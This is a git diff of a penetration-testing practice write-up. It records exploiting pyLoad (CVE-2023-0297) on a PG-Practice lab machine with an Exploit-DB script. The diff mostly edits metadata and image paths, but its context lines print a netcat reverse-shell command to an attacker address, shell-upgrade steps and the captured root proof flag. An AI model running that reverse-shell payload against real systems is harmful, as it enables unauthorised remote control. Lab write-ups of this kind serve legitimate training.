@@ -1,5 +1,6 @@
 ---
 Date: 2024-10-14
+Course: "[[OSCP]]"
 Platform: PG-Practice
 Category: Linux
 Difficulty: Intermediate
@@ -57,10 +58,10 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 No enumeration conducted
 ## Port 9888 -  (Apache)
 - Navigated to `http://192.168.165.26:9666` and identified `pyLoad`
-![[Pasted image 20241014202443.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241014202443.png]]
 	- Potentially vulnerable to CVE-2023-0297
 - Navigated to `http://http://192.168.165.26:9666/robots.txt`
-![[Pasted image 20241014202759.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241014202759.png]]
 ---
 # Exploitation
 - Identified potential exploit `51532.py` from [Exploit Database](https://www.exploit-db.com/exploits/51532) - copied exploit to local host, started netcat listener on port `4444` and ran exploit with python reverse shell
@@ -68,7 +69,7 @@ No enumeration conducted
 python3 51532.py -u http://192.168.165.26:9666 -c 'busybox nc 192.168.45.200 4444 -e /bin/sh'
 ```
 - Caught reverse shell as `root`
-![[Pasted image 20241014203650.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241014203650.png]]
 - Ran `/usr/bin/script -qc /bin/bash /dev/null` to get full shell, then ran `cat /root/proof.txt` to print `b9c8fbfddbc8b37c93422b4d8e14d88e`
 ---
 # Trophy & Loot
